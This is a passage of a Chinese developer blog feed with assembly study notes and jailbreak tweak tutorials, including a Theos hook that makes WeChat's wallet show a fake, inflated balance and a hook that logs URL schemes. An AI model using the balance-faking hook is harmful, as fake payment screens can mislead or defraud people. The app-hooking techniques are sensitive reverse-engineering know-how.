&lt;p&gt;CPU通过端口地址来定位端口，因为端口所在的芯片和CPU通过总线相连，所以，端口地址和内存地址一样，通过地址总线来传送。在PC系统中，CPU最多可以定位64KB个不同的端口。则端口的地址范围为0~65535.&lt;/p&gt;

&lt;p&gt;对端口的读写不能用&lt;code class=&quot;highlighter-rouge&quot;&gt;mov、push、pop&lt;/code&gt;等内存读写指令。&lt;/p&gt;

&lt;p&gt;端口的读写指令只有两条&lt;code class=&quot;highlighter-rouge&quot;&gt;in&lt;/code&gt;和&lt;code class=&quot;highlighter-rouge&quot;&gt;out&lt;/code&gt;，分别用于从端口读取数据和往端口写入数据。&lt;/p&gt;

&lt;p&gt;访问端口：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    in al,60h    //从60h号端口读入一个字节
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;CPU通过地址线将地址信息60h发出；
CPU通过控制线发出端口读命令，选中端口所在的芯片，并通知它，将要从中读取数据；
端口所在芯片将60h端口中的数据通过数据线送入CPU&lt;/p&gt;

&lt;p&gt;在&lt;code class=&quot;highlighter-rouge&quot;&gt;in&lt;/code&gt;和&lt;code class=&quot;highlighter-rouge&quot;&gt;out&lt;/code&gt;指令中，只能使用&lt;code class=&quot;highlighter-rouge&quot;&gt;ax&lt;/code&gt;或&lt;code class=&quot;highlighter-rouge&quot;&gt;al&lt;/code&gt;来存放从端口中读取或要发送到端口中的数据。&lt;/p&gt;

&lt;p&gt;访问8位端口时用al，访问16位端口用ax。&lt;/p&gt;

&lt;h4 id=&quot;cmos-ram芯片&quot;&gt;CMOS RAM芯片&lt;/h4&gt;

&lt;p&gt;PC机中，有一个&lt;code class=&quot;highlighter-rouge&quot;&gt;CMOS RAM&lt;/code&gt;芯片，一般简称&lt;code class=&quot;highlighter-rouge&quot;&gt;CMOS&lt;/code&gt;。芯片特性如下&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;包含一个实时钟和一个有128个存储单元的RAM存储器。&lt;/li&gt;
  &lt;li&gt;该芯片靠电池供电，关机后内部实时钟仍可正常工作，RAM中的信息不丢失。&lt;/li&gt;
  &lt;li&gt;128个字节的RAM中，内部实时钟占用0~0dh单元来保存时间信息，其余大部分单元用于保存系统配置信息，供系统启动时BIOS程序读取。BIOS页也提供了相关的程序，使我们可以在开始的时候配置&lt;code class=&quot;highlighter-rouge&quot;&gt;CMOS RAM&lt;/code&gt;中的系统信息。&lt;/li&gt;
  &lt;li&gt;该芯片内部有两个端口，端口地址为70h和71h。CPU通过这两个端口来读写&lt;code class=&quot;highlighter-rouge&quot;&gt;CMOS RAM&lt;/code&gt;。&lt;/li&gt;
  &lt;li&gt;70h为地址端口，存放要访问的&lt;code class=&quot;highlighter-rouge&quot;&gt;CMOS RAM&lt;/code&gt;单元的地址；71h位数据端口，存放从选定的&lt;code class=&quot;highlighter-rouge&quot;&gt;CMOS RAM&lt;/code&gt;单元读取的数据，或要写入到其中的数据.CPU对&lt;code class=&quot;highlighter-rouge&quot;&gt;CMOS RAM&lt;/code&gt;的读写分两步进行。&lt;code class=&quot;highlighter-rouge&quot;&gt;1.将2送入端口70h； 2.从端口71h读出2号单元的内容&lt;/code&gt;。&lt;/li&gt;
  &lt;li&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;shl和shr指令&quot;&gt;shl和shr指令&lt;/h4&gt;

&lt;p&gt;shl和shr是逻辑位移指令。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;shl:&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;将一个寄存器或内存单元中的数据向左移位&lt;/li&gt;
  &lt;li&gt;将最后移出的移位写入CF中&lt;/li&gt;
  &lt;li&gt;最低位补0&lt;/li&gt;
&lt;/ul&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    mov al,01001000b
    shl al,1   //将al中的数据左移一位
    //执行后al=10010000b,CF=0
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;cmos-ram中存储的时间信息&quot;&gt;CMOS RAM中存储的时间信息&lt;/h4&gt;

&lt;p&gt;在CMOS RAM中，存放着当前的时间：年、月、日、时、分、秒。这6个信息长度都为1字节，存放单元为：
秒0 分2 时4 日7 月8 年9&lt;/p&gt;

&lt;p&gt;这些数据以BCD码方式存放。一个字节可以表示两个BCD码，高4位BCD码表示十位，低4位BCD码表示各位。
例:00010100b表示14&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    //读取月份
    mov al,8    //设置要读取的单元
    out 70h,al  //要读取的单元地址传给CMOS
    in al,71h   //从数据端口71h中取得指定单元的数据
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h3 id=&quot;外中断&quot;&gt;外中断&lt;/h3&gt;

&lt;p&gt;CPU除了能执行指令，进行运算外，还应该能够对外部设备进行控制，接受它们的输入，向它们输出。I/O能力。&lt;/p&gt;

&lt;p&gt;外设的输入不直接送入内存和CPU,而是送入相关的接口芯片的端口中。CPU向外设的输出也不是直接送入外设。
CPU还可以向外设输出控制命令，也都是先送到相关芯片的端口中，在由相关芯片根据命令对外设实施控制。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;CPU通过端口和外部设备进行联系&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;当外设的输入到达，相关芯片将向CPU发出相应的中断信息。CPU执行完当前指令后，检测到发送过来的中断信息，引发中断过程，处理外设的输入。&lt;/p&gt;

&lt;p&gt;在PC系统中，外中断源一共有一下两类:&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;1.可屏蔽中断&lt;/strong&gt;
可屏蔽中断是CPU可以不响应的外中断。CPU是否响应可屏蔽中断，要看标志寄存器的IF位的设置，IF=1，CPU执行完当前指令后响应中断，IF=0，不响应。
前面讲到的内中断中有一步是IF=0，TF=0,这里就能开出作用了，内中断时不响应可屏蔽中断。&lt;/p&gt;

&lt;p&gt;8086提供了设置IF的指令
sti,设置IF=1。cli,设置IF=0。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;2.不可屏蔽中断&lt;/strong&gt;
不可屏蔽中断是CPU必须响应的外中断。当CPU检测到后，当前指令执行完，立即响应。
8086的不可屏蔽中断的中断类型码固定为2，所以中断过程中，不需要取中断类型码。中断过程如下：&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;标志寄存器入栈，设置IF=0，TF=0&lt;/li&gt;
  &lt;li&gt;CS、IP入栈&lt;/li&gt;
  &lt;li&gt;IP=0,CS=0AH&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;几乎所有由外设引发的外中断，都是可屏蔽中断。
不可屏蔽中断是系统中有必须处理的紧急情况发生时用来通知CPU的中断信息。&lt;/p&gt;

&lt;h4 id=&quot;pc机键盘的处理过程&quot;&gt;PC机键盘的处理过程&lt;/h4&gt;

&lt;h5 id=&quot;键盘输入&quot;&gt;键盘输入&lt;/h5&gt;

&lt;p&gt;键盘上的每一个键相当于一个开关，键盘中有一个芯片对键盘上的每一个键的开关状态进行扫描。按下一个键时，开关接通，该芯片就产生一个扫描码，扫描码说明了键在键盘的位置，扫描码被送入主板上的相关接口芯片的寄存器中，端口为60h。
松开按键时，也产生一个扫描码。说明了松开按键的位置，页送入60h端口中。&lt;/p&gt;

&lt;p&gt;一般讲按下产生的扫描码称为通码，松开时产生的称为断码。扫描码长度为一个字节，通码的第7位为0，断码第7位为1。
断码=通码+80h&lt;/p&gt;

&lt;h5 id=&quot;引发9号中断&quot;&gt;引发9号中断&lt;/h5&gt;

&lt;p&gt;当键盘的输入到达60h端口时，相关芯片就会向CPU发出中断类型码为9的可屏蔽中断信息。CPU检测到该中断信息后，如果IF=1，则响应中断。执行int 9的中断例程。&lt;/p&gt;

&lt;h5 id=&quot;执行9号中断&quot;&gt;执行9号中断&lt;/h5&gt;

&lt;p&gt;BIOS提供了int 9中断例程，用来进行基本的键盘输入处理。&lt;/p&gt;

&lt;p&gt;1.读出60h端口中的扫描码&lt;/p&gt;

&lt;p&gt;2.如果是字符键的扫描码，将该扫描码和它所对应的字符码（ASCII码）送入内存中的BIOS键盘缓存区；如果是控制键（如Ctrl）和切换键的扫描码，则将其转变为状态字节，写入内存中存储状态的字节单元。&lt;/p&gt;

&lt;p&gt;3.对键盘系统进行相关的控制，比如说，向相关芯片发出应答信息。&lt;/p&gt;

&lt;p&gt;BIOS键盘缓冲区是系统启动后，BIOS用于存放int 9中断例程所接收的键盘输入的内存区。该内存区可以储存15个键盘输入。因为int 9中断例程除了接收扫描码外，还要产生和扫描码对应的字符码，所以在BIOS的键盘缓冲区中，一个键盘输入用一个字单元存放，高位字节存放扫描码，低位字节存放字符码。&lt;/p&gt;

&lt;p&gt;0040:17单元存储键盘状态字节，该字节记录了控制键和切换键的状态。键盘状态字节各位记录的信息如下。&lt;/p&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;第几字节&lt;/th&gt;
      &lt;th&gt;置1表示&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;0&lt;/td&gt;
      &lt;td&gt;右shift&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;1&lt;/td&gt;
      &lt;td&gt;左shift&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;2&lt;/td&gt;
      &lt;td&gt;Ctrl&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;3&lt;/td&gt;
      &lt;td&gt;Alt&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;4&lt;/td&gt;
      &lt;td&gt;Scroll灯亮&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;5&lt;/td&gt;
      &lt;td&gt;小键盘输入的是数字&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;6&lt;/td&gt;
      &lt;td&gt;输入大写字母&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;7&lt;/td&gt;
      &lt;td&gt;删除态&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;h3 id=&quot;直接定址表&quot;&gt;直接定址表&lt;/h3&gt;

&lt;p&gt;前面有用标号来标记指令、数据、段的起始地址的用法。这些标号仅仅表示了内存单元的地址。&lt;/p&gt;

&lt;p&gt;还要一种标号，不但表示内存单元的地址，还表示内存单元的长度，即表示在此标号处的单元，是一个字节单元，还是字单元，还是双字单元。&lt;/p&gt;

&lt;p&gt;如：&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    assume cs:code
    code segment
        //这里的标号后面没有&quot;:&quot;，它们是同时描述内存地址和单元长度的标号
        a db 1,2,3,4,5,6,7,8  //a描述了地址code:0，以后的内存单元都是字节单元
        b dw 0                //b描述了地址code:8，以后的内存单元都是字单元
      start:mov si,0
            mov cx,8
          s:mov al,a[si]
            mov ah,0
            add b,ax
            inc si
            loop s
            mov ax,4c00h
            int 21h
    code ends
    end start
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;这样指定之后,下面的指令中，标号b代表了一个内存单元，地址为code:8，长度为两个字节。&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;指令：  mov ax,b
相当于：mov ax,cs:[8]

指令：  mov b,2
相当于：mov word ptr cs:[8],2

指令：  inc b
相当于：inc word ptr cs:[8]
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;h4 id=&quot;在其他段中使用数据标号&quot;&gt;在其他段中使用数据标号&lt;/h4&gt;

&lt;p&gt;一般来说，我们不在代码段中定义数据，而是将数据定义到其他段中，在其他段中，我们也可以使用数据标号来描述储存数据的单元的地址和长度。
在后面加油”:”的地址标号，只能在代码段中使用，不能在其他段中使用。&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    assume cs:code,ds:data //把data和ds寄存器联系起来
    data segment
       a db 1,2,3,4,5,6,7,8
       b dw 0
       c dw a,b   //可以将标号当作数据来定义，标号所表示的地址当作数据的值。
                  //相当于c dw offset a,seg a,offset b,seg b。seg操作符能取得标号的段地址
    data ends
    
    code segment
    start: mov ax,data   //先要把ds设置为data段的段地址
           mov ds,ax
           
           mov si,0
           mov cx,8
        s: mov al,a[si]  //相当于mov al,[si+0]
           mov ah,0
           add b,ax      //相当于add [8],ax
           inc si
           loop s
           
           mov ax,4c00h
           int 21h
    code ends
    end start
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;程序的入口地址也能用直接定址表存放&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    setscreen: jmp short set
         table dw sub1,sub2,sub3,sub4
          set: push bx
               cmp ah,3                //判断功能号是否大于3
               ja sret
               mov bl,ah
               mov bh,0
               add bx,bx               //计算子程序的便宜地址
               
               call word ptr table[bx] //调用对应的子程序
               
         sret: pop bx
               ret
    
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;运用前面的知识还能改成下面这样&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;	setscreen: cmp ah,0
               je do1
               cmp ah,1
               je do2
               cmp ah,2
               je do3
               cmp ah,3
               je do4
               jmp short sret
          do1: call sub1
               jmp short sret
          do2: call sub2
               jmp short sret
          do3: call sub3
               jmp short sret
          do4: call sub4
          
         sret: ret
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

</description>
        <pubDate>Thu, 03 Aug 2017 12:00:00 +0000</pubDate>
        <link>http://localhost:4000/2017/08/03/%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</link>
        <guid isPermaLink="true">http://localhost:4000/2017/08/03/%E6%B1%87%E7%BC%96%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</guid>
        
        <category>汇编</category>
        
        
      </item>
    
      <item>
        <title>一行代码修改微信余额</title>
        <description>&lt;h3 id=&quot;flex的使用&quot;&gt;Flex的使用&lt;/h3&gt;

&lt;p&gt;以前一直用Flex来实现这个装逼功能，不过用Flex缺点非常的明显，它只能返回一个固定值，不会随着你的使用减少，正好最近在研究越狱开发，不如自己来写一个，顺便记录学习过程。
Flex这个插件的确很好用，你觉得哪个方法是控制你要修改的值，直接修改返回值试一试就能知道对不对。&lt;/p&gt;

&lt;p&gt;点这个加号添加一个新补丁
&lt;img src=&quot;http://localhost:4000/img/in-post/changewxmoney1.PNG&quot; alt=&quot;Application Support&quot; /&gt;&lt;/p&gt;

&lt;p&gt;title是设置补丁的名字，选下面的Add Units…
&lt;img src=&quot;http://localhost:4000/img/in-post/changewxmoney2.PNG&quot; alt=&quot;Application Support&quot; /&gt;&lt;/p&gt;

&lt;p&gt;选微信，下面是一些系统的库。
&lt;img src=&quot;http://localhost:4000/img/in-post/changewxmoney3.PNG&quot; alt=&quot;Application Support&quot; /&gt;&lt;/p&gt;

&lt;p&gt;到这一步就看到了微信的类，点进去能查看类的方法，到这里和class-dump功能差不多
&lt;img src=&quot;http://localhost:4000/img/in-post/changewxmoney4.PNG&quot; alt=&quot;Application Support&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;寻找目标方法&quot;&gt;寻找目标方法&lt;/h3&gt;

&lt;p&gt;现在可以开始动手找要Hook的方法了。开始果断先搜索一下&lt;code class=&quot;highlighter-rouge&quot;&gt;money&lt;/code&gt;关键字,应该是返回&lt;code class=&quot;highlighter-rouge&quot;&gt;double&lt;/code&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;long&lt;/code&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;int&lt;/code&gt;之类的吧。找了半天没找到，前面两个看着像随机红包的金额，不知道对不对，谁给我发个红包试一试呗。
&lt;img src=&quot;http://localhost:4000/img/in-post/changewxmoney5.PNG&quot; alt=&quot;Application Support&quot; /&gt;&lt;/p&gt;

&lt;p&gt;英语水平不够，翻译软件来凑。钱包，余额，各种关键字翻译了往搜索框里面丢，最后让我在&lt;code class=&quot;highlighter-rouge&quot;&gt;WCPayBalanceInfo&lt;/code&gt;里面发现有一个方法，这个方法返回了微信钱包里面显示的值。&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;-(long)m_uiAvailableBalance
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;点进去设置Return Value为99999，进钱包看一下，确实变了，不过少了2位，做过微信支付的都知道微信是以分为单位。
&lt;img src=&quot;http://localhost:4000/img/in-post/changewxmoney6.PNG&quot; alt=&quot;Application Support&quot; /&gt;&lt;/p&gt;

&lt;p&gt;虽然很容易就找到了，不过这样碰运气的寻找方式终究不是好的办法，是时候好好学习下汇编了。&lt;/p&gt;

&lt;h3 id=&quot;开始写插件&quot;&gt;开始写插件&lt;/h3&gt;

&lt;p&gt;既然要Hook的方法已经找到，接下来就简单了，老一套theos建工程，在xm文件里面写这些代码，数字你想改多少都行。&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;%hook WCPayBalanceInfo
-(long)m_uiAvailableBalance{
	return 6570000;
}
%end
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;make package install&lt;/code&gt;后进微信看看，有效果。只是钱的数值依然不能随着我们使用而改变。这里就需要用上&lt;code class=&quot;highlighter-rouge&quot;&gt;%orig&lt;/code&gt;。&lt;/p&gt;

&lt;p&gt;%orig会执行一遍原本的方法，有返回值也会返回回来，这样的话，上面的代码直接给成这样就OK了。这相当于给我们原本的余额加了一个基本值。&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;%hook WCPayBalanceInfo
-(long)m_uiAvailableBalance{
	return %orig+6570000;
}
%end
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;到这里我们的插件就基本能用了，不过不能控制插件的开启与关闭，也不能自定义这个基本值为多少。这就需要我们再进一步的优化一下了。&lt;/p&gt;

&lt;h3 id=&quot;增加开关及基本值自定义功能&quot;&gt;增加开关及基本值自定义功能&lt;/h3&gt;

&lt;p&gt;上一篇博客&lt;a href=&quot;https://yasintian.github.io/2017/06/01/UrlScheme%E6%9F%A5%E7%9C%8B/&quot;&gt;查看App之间的跳转协议&lt;/a&gt;里面我们用到了&lt;a href=&quot;https://github.com/DHowett/preferenceloader&quot;&gt;PreferenceLoader&lt;/a&gt;这个库，其实这个库的功能非常强大，提供了很多的控件来帮我们搭建我们的设置页面。
还和上次一样在根目录layout文件夹，里面加入对应的&lt;code class=&quot;highlighter-rouge&quot;&gt;plist&lt;/code&gt;文件和&lt;code class=&quot;highlighter-rouge&quot;&gt;icon&lt;/code&gt;，具体结构如下图。
&lt;img src=&quot;http://localhost:4000/img/in-post/changewxmoney7.png&quot; alt=&quot;最后是这个样子&quot; /&gt;&lt;/p&gt;

&lt;p&gt;不过这次的&lt;code class=&quot;highlighter-rouge&quot;&gt;Plist&lt;/code&gt;文件和上次就不太一样了，上次直接引入的Applist这个库。这次我们要自己搭建界面了。
&lt;img src=&quot;http://localhost:4000/img/in-post/changewxmoney8.png&quot; alt=&quot;Plist文件&quot; /&gt;&lt;/p&gt;

&lt;p&gt;这次的&lt;code class=&quot;highlighter-rouge&quot;&gt;Plist&lt;/code&gt;文件包含了三个模块。先看看&lt;code class=&quot;highlighter-rouge&quot;&gt;title&lt;/code&gt;和&lt;code class=&quot;highlighter-rouge&quot;&gt;entry&lt;/code&gt;这两个比较简单，是标题和设置界面里面cell的设置。&lt;/p&gt;

&lt;p&gt;比较复杂的是items这个数组里面，这个数组掌管了你的界面布局，preferenceloader这个插件真的是非常厉害，配置下Plist文件就能实现我们想要的功能。
&lt;img src=&quot;http://localhost:4000/img/in-post/changewxmoney9.png&quot; alt=&quot;Plist文件&quot; /&gt;&lt;/p&gt;

&lt;p&gt;看了这个图，相信你已经明白了个大概。每一个&lt;code class=&quot;highlighter-rouge&quot;&gt;item&lt;/code&gt;表示了一个控件。
&lt;img src=&quot;http://localhost:4000/img/in-post/changewxmoney10.PNG&quot; alt=&quot;效果图&quot; /&gt;&lt;/p&gt;

&lt;p&gt;和结果图对比可能会更清晰一点。
这里面真正有用的是&lt;code class=&quot;highlighter-rouge&quot;&gt;item1&lt;/code&gt;和&lt;code class=&quot;highlighter-rouge&quot;&gt;item2&lt;/code&gt;。&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;item1&lt;/code&gt;是开关&lt;code class=&quot;highlighter-rouge&quot;&gt;PSSwitchCell&lt;/code&gt;，更具名字能看出是一个拥有选择功能的cell。default是默认值，我们默认为NO。defaults和key是至关重要的两个值，&lt;code class=&quot;highlighter-rouge&quot;&gt;defaults&lt;/code&gt;会在&lt;code class=&quot;highlighter-rouge&quot;&gt;/var/mobile/Library/Preferences/com.yasin.ChangeWXMoney.plist&lt;/code&gt;生成对应的&lt;code class=&quot;highlighter-rouge&quot;&gt;Plist&lt;/code&gt;文件，而key表示这个空间和&lt;code class=&quot;highlighter-rouge&quot;&gt;Plist&lt;/code&gt;文件里面的哪个值绑定。&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;item2&lt;/code&gt;是一个带有输入框的Cell。&lt;code class=&quot;highlighter-rouge&quot;&gt;defaults&lt;/code&gt;和&lt;code class=&quot;highlighter-rouge&quot;&gt;key&lt;/code&gt;和上面的作用一样。isDecimalPad表示我需要用数字键盘。&lt;/p&gt;

&lt;p&gt;更多的cell你可以到这里查看
&lt;a href=&quot;http://iphonedevwiki.net/index.php/Preferences_specifier_plist&quot;&gt;http://iphonedevwiki.net/index.php/Preferences_specifier_plist&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;到这里开关和基本值输入框我们就配置好了，可以先运行看看界面有没有出现在设置里面。&lt;/p&gt;

&lt;h3 id=&quot;修改xm文件获取开关状态及基本值&quot;&gt;修改XM文件获取开关状态及基本值&lt;/h3&gt;
&lt;p&gt;前面说到设置&lt;code class=&quot;highlighter-rouge&quot;&gt;defaults&lt;/code&gt;会生成一个&lt;code class=&quot;highlighter-rouge&quot;&gt;Plist&lt;/code&gt;文件，我们先把这个文件的地址定义成宏。&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;#define PLIST_PATH @&quot;/var/mobile/Library/Preferences/com.yasin.ChangeWXMoney.plist&quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;接着修改代码,加入了判断，如果开关是开启的状态就返回(原函数返回值+基本值)，否则就返回原函数的返回值。&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;%hook WCPayBalanceInfo
-(long)m_uiAvailableBalance{
    NSDictionary *dic = [NSDictionary dictionaryWithContentsOfFile:PLIST_PATH];
    if(dic&amp;amp;&amp;amp;dic[@&quot;MoneySwitch&quot;]){
        BOOL MoneySwitch = [dic[@&quot;MoneySwitch&quot;] boolValue];
        CGFloat money = [[[NSDictionary dictionaryWithContentsOfFile:PLIST_PATH] valueForKey:@&quot;money&quot;] floatValue];
        if(MoneySwitch){
            return %orig+100*money;
        }
    }
    return %orig;
}
%end
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;到这里修改微信余额的功能就弄完了，快编译运行去装逼吧。&lt;/p&gt;

</description>
        <pubDate>Mon, 05 Jun 2017 12:00:00 +0000</pubDate>
        <link>http://localhost:4000/2017/06/05/%E4%B8%80%E8%A1%8C%E4%BB%A3%E7%A0%81%E4%BF%AE%E6%94%B9%E5%BE%AE%E4%BF%A1%E4%BD%99%E9%A2%9D/</link>
        <guid isPermaLink="true">http://localhost:4000/2017/06/05/%E4%B8%80%E8%A1%8C%E4%BB%A3%E7%A0%81%E4%BF%AE%E6%94%B9%E5%BE%AE%E4%BF%A1%E4%BD%99%E9%A2%9D/</guid>
        
        <category>装逼</category>
        
        
      </item>
    
      <item>
        <title>查看App之间的跳转协议</title>
        <description>&lt;p&gt;&lt;a href=&quot;https://github.com/yohunl/FlexInjected&quot;&gt;参考文章&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;一直想做一个App能跳转到我想去的App里面，网上找urlScheme也就是那么几个，而且大多数只能打开App不能分析进入里面的功能，索性我自己弄一个截获跳转协议的工具好了。在很久以前就已经搭建好了theos的环境，不过好久没动过了。&lt;/p&gt;

&lt;h3 id=&quot;创建工程&quot;&gt;创建工程&lt;/h3&gt;

&lt;p&gt;创建工程还是老步骤&lt;/p&gt;
&lt;ol&gt;
  &lt;li&gt;/opt/theos/bin/nic.pl&lt;/li&gt;
  &lt;li&gt;选择[11.] iphone/tweak&lt;/li&gt;
  &lt;li&gt;填你的工程名，包名，作者，要hook的bundleid这里我们填com.apple.UIKit这样能对所有的app生效&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&quot;hook函数&quot;&gt;Hook函数&lt;/h3&gt;

&lt;p&gt;ios下跳转到其他App主要是&lt;code class=&quot;highlighter-rouge&quot;&gt;UIApplication&lt;/code&gt;的这两个方法，先试一下能不能行&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;%hook UIApplication
-(BOOL)openURL:(NSURL*)url{
	UIAlertView * alert = [[UIAlertView alloc]initWithTitle:@&quot;Welcome&quot; message:url.absoluteString delegate:nil cancelButtonTitle:@&quot;Thanks&quot; otherButtonTitles:nil];
	[alert show];
	return %orig;
}

- (void)openURL:(NSURL*)url options:(NSDictionary&amp;lt;NSString *, id&amp;gt; *)options completionHandler:(id)completion{
	UIAlertView * alert = [[UIAlertView alloc]initWithTitle:@&quot;Welcome&quot; message:url.absoluteString delegate:nil cancelButtonTitle:@&quot;Thanks&quot; otherButtonTitles:nil];
	[alert show];
	%orig;
}

%end
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;分享文章到QQ试了试urlscheme就出来了。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/img/in-post/showsuccess.png&quot; alt=&quot;截屏分享到QQ&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;从接收端入手&quot;&gt;从接收端入手&lt;/h3&gt;

&lt;p&gt;前是从发送端入手，现在我们来看看接收端，从外部打开app主要是这几个方法，最后是个是ios9出的通用链接（Universal Links）进入的回调方法。全部都把url弹出来，在微信和QQ之间测试，发现QQ竟然换掉了系统的AlertView，当页面消失的时候就会收回弹框&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;%hook AppDelegate

- (BOOL)application:(UIApplication *)application openURL:(NSURL *)url sourceApplication:(NSString *)sourceApplication annotation:(id)annotation{
    UIAlertView * alert = [[UIAlertView alloc]initWithTitle:@&quot;Welcome&quot; message:url.absoluteString delegate:nil cancelButtonTitle:@&quot;Thanks&quot; otherButtonTitles:nil];
    [alert show];
    return %orig;
}

-(BOOL)application:(UIApplication *)app openURL:(NSURL *)url options:(NSDictionary&amp;lt;UIApplicationOpenURLOptionsKey,id&amp;gt; *)options{
    UIAlertView * alert = [[UIAlertView alloc]initWithTitle:@&quot;Welcome&quot; message:url.absoluteString delegate:nil cancelButtonTitle:@&quot;Thanks&quot; otherButtonTitles:nil];
    [alert show];
    return %orig;
}

-(BOOL)application:(UIApplication *)application handleOpenURL:(NSURL *)url{
    UIAlertView * alert = [[UIAlertView alloc]initWithTitle:@&quot;Welcome&quot; message:url.absoluteString delegate:nil cancelButtonTitle:@&quot;Thanks&quot; otherButtonTitles:nil];
    [alert show];
    return %orig;
}

-(BOOL)application:(UIApplication *)application continueUserActivity:(NSUserActivity *)userActivity restorationHandler:(void (^)(NSArray * _Nullable))restorationHandler{
    UIAlertView * alert = [[UIAlertView alloc]initWithTitle:@&quot;Welcome&quot; message:userActivity.webpageURL.absoluteString delegate:nil cancelButtonTitle:@&quot;Thanks&quot; otherButtonTitles:nil];
    [alert show];
    return %orig;
}

%end
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;代码写完了还是通过，&lt;code class=&quot;highlighter-rouge&quot;&gt;make&lt;/code&gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;package&lt;/code&gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;install&lt;/code&gt;&lt;/p&gt;

&lt;h3 id=&quot;对指定app启用&quot;&gt;对指定App启用&lt;/h3&gt;

&lt;p&gt;试了试可以看到app间的跳转协议了，但是这样很不方便，当我正常使用的时候很麻烦，每次都要点击关闭这个弹框，这里我们就需要做一个选择开启的功能。
